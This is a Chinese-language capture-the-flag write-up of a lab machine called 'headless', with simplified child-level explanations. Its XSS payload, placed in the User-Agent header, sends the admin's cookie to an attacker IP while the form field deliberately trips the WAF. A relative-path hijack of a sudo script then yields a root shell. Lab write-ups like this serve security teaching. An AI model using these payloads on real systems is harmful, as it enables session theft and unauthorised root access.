Phase 1

立足点：XSS 窃取 Cookie → 命令注入

User-Agent XSS 绕过 WAF

🧒 儿童版 — WAF 只查表单不查 Header 网站有个"举报黑客"功能——你提交恶意内容，它会弹出警告页面并把你的请求信息发给管理员审查。WAF 检查了表单内容，但没检查 User-Agent。我们在 User-Agent 里藏 XSS 代码，表单里故意触发 WAF。管理员打开举报页面时，User-Agent 里的代码就执行了——cookie 就被偷走了。 
# Burp 拦截 /support POST，修改 User-Agent：
User-Agent: <script>var i=new Image(); i.src="http://10.10.14.73:5000/?cookie="+btoa(document.cookie);</script>
# message 字段保留 <script>alert(1)</script> 触发 WAF

# 攻击机监听收到：
GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=

Phase 2

权限提升：syscheck 相对路径劫持

dvir@headless:~$ sudo -l
(ALL) NOPASSWD: /usr/bin/syscheck
# syscheck 脚本关键部分：
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null    ← 相对路径！
fi
🧒 儿童版 — 在当前目录放假脚本 syscheck 脚本里写了"启动 ./initdb.sh"——注意 ./，意思是"在当前所在的文件夹里找"。我们跑到 /tmp，在那里放一个假的 initdb.sh（里面写着"给我开 bash"），然后从 /tmp 运行 syscheck。root 就会执行我们的假脚本。 
dvir@headless:~$ cd /tmp
dvir@headless:/tmp$ echo -e '#!/bin/bash\n/bin/bash' > initdb.sh
dvir@headless:/tmp$ chmod +x initdb.sh
dvir@headless:/tmp$ sudo /usr/bin/syscheck

root@headless:/tmp# cat /root/root.txt

知识点总结

XSS 绕过 WAF：把 payload 放在 HTTP Header 里。

当表单字段被过滤时，尝试 User-Agent、Referer、Cookie。如果应用会展示这些 Header 的内容，XSS 就能触发。

HTTP 表单编码中空格 = +。

application/x-www-form-urlencoded 格式中空格编码为 +。在 Burp 中注入命令时需注意。

相对路径提权。

脚本用 ./script.sh 而非绝对路径调用时，可以在当前目录创建同名恶意文件来劫持执行。关键是要从你控制的目录运行 sudo 命令。
